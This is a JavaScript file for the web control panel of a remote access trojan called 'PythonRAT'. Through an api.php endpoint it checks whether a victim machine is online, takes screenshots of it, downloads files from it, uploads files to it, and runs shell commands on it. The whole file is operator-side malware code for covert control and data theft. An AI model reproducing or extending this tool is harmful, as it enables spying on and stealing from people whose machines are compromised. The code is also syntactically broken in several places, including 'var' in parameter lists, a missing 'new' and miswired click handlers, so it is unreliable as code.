//API URL for command requests/responses
var url = window.location.protocol + '//' + window.location.host + '/PythonRAT/api.php';

//button elements
var status_button = document.getElementById('status_button');
var screenshot_button = document.getElementById('screenshot_button');
var getfile_button = document.getElementById('getfile_button');
var sendfile_button = document.getElementById('sendfile_button');
var cmd_button = document.getElementById('cmd_button');

//function for updating status table
function updateStatus(var button){
	var conn_status = document.getElementById('conn_status');
	
	//disable update button
	button.setAttribute('disabled', '');
	
	//get cells from status table
	var cells = document.getElementById('status_table').getElementsByTagName('td');
	
	//get cells field IDs (except connection status)
	var fields = [];
	for(var i in cells){
		if(!isNaN(i) && cells[i].id != 'conn_status')
			fields.push(cells[i].id);
	}
	
	//change values to loading
	conn_status.innerHTML = '<img src="img/loading.gif" class="loading" /> Loading...';
	for(var i in fields)
		document.getElementById(fields[i]).innerHTML = '<img src="img/loading.gif" class="loading" /> Loading...';
	
	//init request
	request = new XMLHttpRequest();
	request.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				//if server response = host offline (60 sec timeout reached)
				if(this.responseText == 'Offline'){
					//restore default values (offline)
					conn_status.innerHTML = '<i class="fa fa-circle offline"></i> Offline';
					for(var i in fields)
						document.getElementById(fields[i]).innerHTML = 'N/D';
				}
				else{
					//parse JSON response
					var response = JSON.parse(this.responseText);
					//set status online
					conn_status.innerHTML = '<i class="fa fa-circle online"></i> Online';
					//set table values
					for(var i in fields)
						document.getElementById(fields[i]).innerHTML = response[fields[i]];
				}
			}
			else{
				//on error, print it and restore default values (offline)
				alert('Connection error: status code ' + this.status);
				document.getElementById('conn_status').innerHTML = '<i class="fa fa-circle offline"></i> Offline';
				for(var i in fields)
					document.getElementById(fields[i]).innerHTML = 'N/D';
			
			}
			//re-enable update button
			button.removeAttribute('disabled');
		}
	};
	
	//send request
	request.open('GET', url + '?setcmd=status');
	request.send();
}

//function for loading latest taken screenshot on page loading or for requesting a new one
function loadScreenshot(var button, var startup){
	//loading div, display on loading, hide when request complete
	var loading = document.getElementById('screenshot_loading');
	button.setAttribute('disabled', '');
	loading.style.display = 'block';
	var request = XMLHttpRequest();
	request.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				//if error encountered, print it and do not change anything
				if(this.responseText.startsWith('Error: '))
					//print error only if pressed button, not on startup retrieving mode
					if(!startup)
						alert(this.responseText);
				else{
					//updating results and appending timestamp to avoid loading cached image
					var timestamp = Date.now().toString();
					document.getElementById('screenshot_image').src = 'scr.png?' + timestamp;
					document.getElementById('screenshot_link').href = 'scr.png?' + timestamp;
					document.getElementById('screenshot_time').innerHTML = 'Taken ' + this.responseText;
				}
			}
			else
				alert('Connection error: status code ' + this.status);
			button.removeAttribute('disabled');
			loading.style.display = 'none';
		}
	};
	//check if just retrieving last screenshot or requesting a new one
	if(startup)
		req_url = url + '?screenshotstatus=1';
	else
		req_url = url + '?setcmd=screenshot';
	request.open('GET', req_url);
	request.send();
}

//function for getting file from client and downloading it
function getFile(var button){
	//getting filepath from input form and URL-Encode it
	var filepath = encodeURIComponent(document.getElementById('getfile_filepath').value);
	var loading = document.getElementById('getfile_loading');
	button.setAttribute('disabled', '');
	loading.style.display = 'block';
	var request = XMLHttpRequest();
	request.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				if(this.responseText.startsWith('Error: '))
					alert(this.responseText);
				else{
					window.open(url + '?getfile=1', '_blank');
				}
			}
			else
				alert('Connection error: status code ' + this.status);
			button.removeAttribute('disabled');
			loading.style.display = 'none';
		}
	};
	//sending filepath via POST request
	request.open('POST', url + '?setcmd=getfile');
	request.send('filepath=' + filepath);
}

//function for sending file to client via HTTP POST
function sendFile(var button){
	var loading = document.getElementById('sendfile_loading');
	button.setAttribute('disabled', '');
	loading.style.display = 'block';
	var request = XMLHttpRequest();
	request.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				if(this.responseText.startsWith('Error: '))
					alert(this.responseText);
				else
					alert('File ' + this.responseText + ' sent correctly');
			}
			else
				alert('Connection error: status code ' + this.status);
			button.removeAttribute('disabled');
			loading.style.display = 'none';
		}
	};
	//init multipart form
	var fd = new FormData();
	//append filepath value and filedata to multipart form
	fd.append('filepath', document.getElementById('sendfile_filepath').value);
	fd.append('file', document.getElementById('sendfile_filedata'.files[0]));
	//send multipart form via HTTP POST request to server
	request.open('POST', url + '?setcmd=sendfile');
	request.send(fd);
}

//function for sending shell command to client and retrieving command output
function sendCommand(var button){
	var command = encodeURIComponent(document.getElementById('cmd_text').value);
	var cmd_output = document.getElementById('cmd_output');
	button.setAttribute('disabled', '');
	cmd_output.innerHTML =  'Waiting for response...';
	var request = XMLHttpRequest();
	request.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				cmd_output.innerHTML = this.responseText;
			}
			else{
				alert('Connection error: status code ' + this.status);
				cmd_output.innerHTML = 'Here there will be displayed the command output as response.';
			}
			button.removeAttribute('disabled');
		}
	};
	request.open('POST', url + '?setcmd=shell');
	request.send('command=' + command);
}

//onload events
updateStatus(status_button);
loadScreenshot(screenshot_button, true);

//onclick events
status_button.onclick = updateStatus(status_button);
screenshot_button.onclick = loadScreenshot(screenshot_button, false);
getfile_button.onclick = getFile(getfile_button);
sendfile_button.onclick = sendFile(sendfile_button);
cmd_button.onclick = sendCommand(cmd_button);
